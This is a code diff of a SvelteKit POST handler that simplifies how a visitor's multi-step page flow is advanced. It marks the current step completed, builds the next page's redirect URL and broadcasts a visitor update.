@@ -204,41 +204,24 @@ export const POST: RequestHandler = async ({ request, getClientAddress, url }) =
 		return !!target;
 	}
 
-	if (assignedFlow && assignedFlow.steps.length > 0 && visitor) {
-		const hasValidSteps = assignedFlow.steps.some((p) => isValidFlowLabel(p) && p !== currentLabel);
-		if (hasValidSteps) {
-			const steps = assignedFlow.steps.map((p) => {
-				const caseCompleted = !!currentLabel && p === currentLabel;
-				return {
-					page: p,
-					status: (!isValidFlowLabel(p) || caseCompleted) ? 'completed' as const : 'not_started' as const,
-					completedAt: caseCompleted ? Date.now() : undefined
-				};
-			});
-			applyFlowSteps(steps, assignedFlow.name);
-		}
-	}
-
-	if (!target && visitor && currentLabel) {
+	if (visitor && currentLabel) {
 		ensureFlowInitialized(visitor);
-		if (visitor.flowSteps.length > 0) {
-			markStepCompleted(visitor, currentLabel);
-			const nextStep = visitor.flowSteps.find((s: any) => s.status !== 'completed' && isValidFlowLabel(s.page));
-			if (nextStep) {
-				targetLabel = nextStep.page;
-				target = isVisitorHost
-					? labelToVisitorUrl(targetLabel, visitor.module, qp.size ? qp : undefined) || ''
-					: (() => {
-						const base = labelToUrl(targetLabel);
-						if (!base) return '';
-						const qs = qp.toString();
-						return qs ? `${base}?${qs}` : base;
-					})();
-				if (target) {
-					flowApplied = true;
-					serverState.setVisitorLastPage(ip, targetLabel);
-					broadcast({ type: 'visitor:updated', payload: visitor });
-				}
+		markStepCompleted(visitor, currentLabel);
+		const nextStep = visitor.flowSteps.find((s: any) => s.status !== 'completed' && isValidFlowLabel(s.page));
+		if (nextStep) {
+			targetLabel = nextStep.page;
+			target = isVisitorHost
+				? labelToVisitorUrl(targetLabel, visitor.module, qp.size ? qp : undefined) || ''
+				: (() => {
+					const base = labelToUrl(targetLabel);
+					if (!base) return '';
+					const qs = qp.toString();
+					return qs ? `${base}?${qs}` : base;
+				})();
+			if (target) {
+				flowApplied = true;
+				serverState.setVisitorLastPage(ip, targetLabel);
+				broadcast({ type: 'visitor:updated', payload: visitor });
 			}
 		}
 	}
